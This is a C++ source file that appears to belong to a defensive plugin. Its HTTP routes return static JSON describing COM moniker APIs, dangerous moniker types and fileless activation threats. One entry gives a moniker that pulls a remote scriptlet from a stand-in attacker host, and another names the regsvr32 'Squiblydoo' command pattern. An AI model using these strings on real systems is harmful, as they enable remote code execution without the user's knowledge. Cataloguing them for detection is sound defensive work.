#include "plugin.h"
#include "http/c_http_router.h"
#include <nlohmann/json.hpp>
using json = nlohmann::json;

namespace handlers {
void register_moniker_activation_routes(c_http_router& router) {
    router.post("/api/moniker/trace_activations", [](const s_http_request& req) {
        json result;
        result["moniker_api_endpoints"] = {
            {"CoGetObject", "Binds display name moniker to running COM object instance"},
            {"MkParseDisplayName", "Parses display name string into IMoniker interface"},
            {"BindMoniker", "Helper function combining parse and bind phases"}
        };
        result["dangerous_moniker_types"] = {
            {"script:", "script:https://attacker.com/payload.sct — Scrobj.dll scriptlet execution"},
            {"clsid:", "clsid:00000000-0000-0000-0000-000000000000 — Direct CLSID binding"},
            {"new:", "new:{GUID} — Instantiates new object instance via moniker"},
            {"file:", "file:///C:/path/to/doc.rtf — Document moniker with composite sub-objects"},
            {"http:/https:", "URL Moniker downloading and activating remote object payload"}
        };
        return s_http_response::ok(result.dump());;
    });

    router.post("/api/moniker/decode_display_names", [](const s_http_request& req) {
        json body; try { body = json::parse(req.body); } catch(...) { body = json::object(); }
        std::string displayName = body.value("display_name", "");
        json result;
        result["display_name"] = displayName;
        result["parsing_logic"] = "Extracts prefix scheme (script:, clsid:, new:, file:), decodes URL parameters, and resolves target COM CLSID and ProgID";
        return s_http_response::ok(result.dump());;
    });

    router.post("/api/moniker/detect_fileless_activation", [](const s_http_request& req) {
        json result;
        result["fileless_moniker_threats"] = {
            "CVE-2017-0199 / CVE-2017-8570 / CVE-2021-40444: Office document exploiting URL/script monikers to execute remote SCT/HTML without macro warnings",
            "Regsvr32 'Squiblydoo' attack (regsvr32 /s /n /u /i:http://... scrobj.dll)"
        };
        return s_http_response::ok(result.dump());;
    });
}
} // namespace handlers

